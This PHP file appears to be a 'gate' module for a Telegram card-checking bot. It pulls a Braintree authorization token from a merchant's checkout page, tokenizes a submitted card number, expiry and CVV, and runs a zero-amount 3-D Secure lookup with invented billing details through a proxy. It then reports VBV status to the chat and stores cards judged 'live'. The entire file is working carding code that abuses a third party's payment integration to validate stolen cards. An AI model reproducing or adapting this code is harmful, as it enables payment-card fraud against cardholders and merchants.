<?php 

use App\Models\Bot;
use App\Gate\{Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# -- REQ 1 -- #
$site1 = ['url' => 'https://woodenwindows.com/checkout/token.php','method' => 'GET', 'post' => null, 'headers' => [], 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

$res1 = json_decode(base64_decode($req1->body), true);
$bearer = $res1['authorizationFingerprint'];

# -- REQ 2 -- #
$header2 = ['Accept: */*', 'Authorization: Bearer '.$bearer, 'Braintree-Version: 2018-05-10', 'Content-Type: application/json', 'Host: payments.braintree-api.com', 'Origin: https://assets.braintreegateway.com', 'Referer: https://assets.braintreegateway.com/'];
$post2 = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"52e10ca2-a384-4564-8674-dc4d18b88667"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc[0].'","expirationMonth":"'.$cc[1].'","expirationYear":"'.$cc[2].'","cvv":"'.$cc[3].'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';
$site2 = ['url' => 'https://payments.braintree-api.com/graphql','method' => 'POST', 'post' => $post2, 'headers' => $header2, 'cookie' => null, 'proxy' => $proxy2];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

$res2 = json_decode($req2->body, true);
$token = $res2['data']['tokenizeCreditCard']['token'];

# -- REQ 1 -- #
$header3 = ['Accept: */*', 'Accept-Language: en-US,en;q=0.9', 'Content-Type: application/json', 'Host: api.braintreegateway.com', 'Origin: https://woodenwindows.com', 'Referer: https://woodenwindows.com/'];
$post3 = '{"amount":"0.00","additionalInfo":{"shippingGivenName":"Jackson","shippingSurname":"Xd","shippingPhone":"9012365489","acsWindowSize":"03","billingLine1":"49-71 Qn Mdtwn Tnnl Entrance W","billingCity":"Queens","billingState":"New York","billingPostalCode":"HP8 9BS","billingCountryCode":"GB","billingPhoneNumber":"9012365489","billingGivenName":"Jackson","billingSurname":"Xd","shippingLine1":"49-71 Qn Mdtwn Tnnl Entrance W","shippingCity":"Queens","shippingState":"New York","shippingPostalCode":"HP8 9BS","shippingCountryCode":"GB","email":"robertsdasew3@sdasdga.com"},"bin":"428909","dfReferenceId":"1_abcd8b48-6602-4d0c-8af7-5f0be4bedcf2","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.54.2","cardinalDeviceDataCollectionTimeElapsed":638,"issuerDeviceDataCollectionTimeElapsed":925,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.54.2","_meta":{"merchantAppId":"woodenwindows.com","platform":"web","sdkVersion":"3.54.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"52e10ca2-a384-4564-8674-dc4d18b88667"}}';
$site3 = ['url' => 'https://api.braintreegateway.com/merchants/xqv6j3tx67zz8trz/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup','method' => 'POST', 'post' => $post3, 'headers' => $header3, 'cookie' => null, 'proxy' => $proxy2];
$req3 = Make::Create(2, $site3, $gate, $user);
IsUnspam($req3, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

$res3 = json_decode($req3->body, true);
$data = $res3['paymentMethod']['threeDSecureInfo'];

Res::SetParams($data['status'], $data['enrolled']);
$res = Res::VbvBr();

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));

try {
    $live = Make::SaveLive($res['live'], $user['id'], $cece, $gate['name'], $res, $ccs['bin']);
} catch (\Exception $e) {
    error_log($e->getMessage());
    echo $e->getMessage();
}